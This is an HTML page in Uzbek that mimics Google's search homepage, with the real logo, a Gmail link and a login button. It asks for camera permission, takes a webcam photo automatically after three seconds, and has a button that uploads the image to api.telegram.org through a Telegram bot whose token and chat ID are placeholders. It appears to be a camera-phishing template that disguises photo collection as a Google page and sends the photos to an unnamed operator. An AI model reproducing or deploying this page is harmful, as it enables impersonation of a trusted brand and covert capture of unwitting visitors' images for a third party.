<!DOCTYPE html>
<html lang="uz">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Google Style Search + Camera (Fixed)</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      margin: 0;
      background: #fff;
    }
    .navbar {
      width: 100%;
      text-align: right;
      padding: 15px 25px;
    }
    .nav-links {
      display: flex;
      align-items: center;
      gap: 15px;
      justify-content: flex-end;
    }
    .login-btn {
      background: #1a73e8;
      color: #fff;
      border: none;
      padding: 8px 15px;
      border-radius: 5px;
      cursor: pointer;
    }
    .container {
      margin-top: 50px;
      text-align: center;
      width: 100%;
      max-width: 900px;
      padding: 0 16px;
    }
    .logo {
      width: 272px;
      margin-bottom: 20px;
    }
    .search-box {
      display: flex;
      align-items: center;
      border: 1px solid #dfe1e5;
      border-radius: 24px;
      width: 580px;
      padding: 10px 15px;
      margin: 0 auto;
    }
    .search-box input {
      flex: 1;
      border: none;
      outline: none;
      font-size: 16px;
    }
    .buttons {
      margin-top: 18px;
    }
    .buttons button {
      padding: 10px 20px;
      margin: 5px;
      border-radius: 4px;
      border: 1px solid #f8f9fa;
      background-color: #f8f9fa;
      color: #3c4043;
      cursor: pointer;
    }
    .buttons button:hover {
      box-shadow: 0 1px 1px rgba(0,0,0,.1);
      border: 1px solid #dadce0;
    }

    .camera-card {
      margin-top: 30px;
      display: flex;
      gap: 20px;
      align-items: flex-start;
      justify-content: center;
      flex-wrap: wrap;
    }
    .cam-box {
      background: #f7f7f7;
      padding: 12px;
      border-radius: 8px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.08);
      width: 360px;
    }
    video, canvas {
      width: 100%;
      border-radius: 6px;
      background: #000;
      display: block;
    }
    .controls {
      display: flex;
      gap: 10px;
      margin-top: 10px;
      justify-content: center;
    }
    .controls button {
      padding: 8px 12px;
      border-radius: 6px;
      border: none;
      cursor: pointer;
    }
    .controls .capture-btn {
      background: #1a73e8;
      color: white;
    }
    .controls .reset-btn {
      background: #f1f3f4;
      color: #3c4043;
    }
    .status {
      margin-top: 10px;
      padding: 8px;
      border-radius: 4px;
      font-size: 14px;
    }
    .status.success { background-color: #e6f4ea; color: #137333; }
    .status.error { background-color: #fce8e6; color: #c5221f; }
    .status.info { background-color: #e8f0fe; color: #1a73e8; }

    /* Modal */
    .permission-modal {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0,0,0,0.6);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 1000;
    }
    .modal-content {
      background: white;
      padding: 25px;
      border-radius: 12px;
      max-width: 400px;
      text-align: center;
      box-shadow: 0 4px 20px rgba(0,0,0,0.15);
    }
    .modal-buttons {
      margin-top: 20px;
      display: flex;
      gap: 10px;
      justify-content: center;
    }
    .allow-btn {
      background: #1a73e8;
      color: white;
      border: none;
      padding: 10px 20px;
      border-radius: 6px;
      cursor: pointer;
    }
    .deny-btn {
      background: #f1f3f4;
      color: #3c4043;
      border: none;
      padding: 10px 20px;
      border-radius: 6px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="navbar">
    <div class="nav-links">
      <a href="#">Gmail</a>
      <a href="#">Rasmlar</a>
      <button class="login-btn">Kirish</button>
    </div>
  </div>

  <div class="container">
    <img class="logo" src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="logo">

    <div class="search-box">
      <input type="text" placeholder="Qidiruv..." />
    </div>

    <div class="camera-card">
      <div class="cam-box">
        <h3>Kamera</h3>
        <video id="video" autoplay playsinline></video>
        <div class="controls">
          <button id="retryCamera" class="capture-btn">Kamerani qayta yoqish</button>
        </div>
      </div>

      <div class="cam-box">
        <h3>Surat natijasi</h3>
        <canvas id="canvas"></canvas>
        <div class="controls">
          <button id="sendBtn" class="capture-btn" disabled>Telegramga yuborish</button>
        </div>
        <div id="status" class="status"></div>
      </div>
    </div>
  </div>

  <div id="permissionModal" class="permission-modal">
    <div class="modal-content">
      <h2>Kamera ruxsati kerak</h2>
      <p>Sayt avtomatik tarzda surat olish uchun kameradan foydalanadi. Ruxsat berasizmi?</p>
      <div class="modal-buttons">
        <button id="allowCamera" class="allow-btn">Ruxsat berish</button>
        <button id="denyCamera" class="deny-btn">Rad etish</button>
      </div>
    </div>
  </div>

  <script>
    const BOT_TOKEN = 'BOT_TOKENINGIZNI_BU_YERGA_QO\'YING';
    const CHAT_ID = 'CHAT_ID_INGIZNI_BU_YERGA_QO\'YING';

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const retryCameraBtn = document.getElementById('retryCamera');
    const sendBtn = document.getElementById('sendBtn');
    const statusDiv = document.getElementById('status');
    const permissionModal = document.getElementById('permissionModal');
    const allowCameraBtn = document.getElementById('allowCamera');
    const denyCameraBtn = document.getElementById('denyCamera');

    let stream = null;
    let capturedImage = null;

    // Modalni ko‘rsatish
    window.addEventListener('load', () => {
      setTimeout(() => {
        permissionModal.style.display = 'flex';
      }, 500);
    });

    allowCameraBtn.addEventListener('click', () => {
      permissionModal.style.display = 'none';
      startCamera();
    });

    denyCameraBtn.addEventListener('click', () => {
      permissionModal.style.display = 'none';
      showStatus("Kamera ruxsati rad etildi.", "error");
    });

    async function startCamera() {
      try {
        showStatus("Kamera ochilmoqda...", "info");
        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        video.srcObject = stream;

        video.onloadedmetadata = () => {
          video.play();
          showStatus("Kamera yoqildi! 3 soniyadan so‘ng avtomatik surat olinadi.", "success");
          setTimeout(() => captureImage(), 3000);
        };
      } catch (error) {
        console.error(error);
        showStatus("Kamera ochilmadi. Iltimos, ruxsat bering.", "error");
      }
    }

    function captureImage() {
      if (!video.videoWidth) {
        showStatus("Video hali tayyor emas, biroz kuting.", "info");
        return;
      }

      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      capturedImage = canvas.toDataURL('image/jpeg');
      sendBtn.disabled = false;

      showStatus("Surat olingan! Endi yuborishingiz mumkin.", "success");

      stopCamera();
    }

    function stopCamera() {
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
        stream = null;
      }
    }

    retryCameraBtn.addEventListener('click', startCamera);

    sendBtn.addEventListener('click', async () => {
      if (!capturedImage) {
        showStatus("Avval surat oling!", "error");
        return;
      }
      try {
        showStatus("Telegramga yuborilmoqda...", "info");

        const blob = await (await fetch(capturedImage)).blob();
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, 'photo.jpg');

        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: formData
        });
        const result = await response.json();

        if (result.ok) {
          showStatus("✅ Surat muvaffaqiyatli yuborildi!", "success");
        } else {
          showStatus("❌ Yuborishda xato: " + result.description, "error");
        }
      } catch (e) {
        console.error(e);
        showStatus("Yuborishda xatolik yuz berdi.", "error");
      }
    });

    function showStatus(message, type) {
      statusDiv.textContent = message;
      statusDiv.className = "status " + type;
    }
  </script>
</body>
</html>
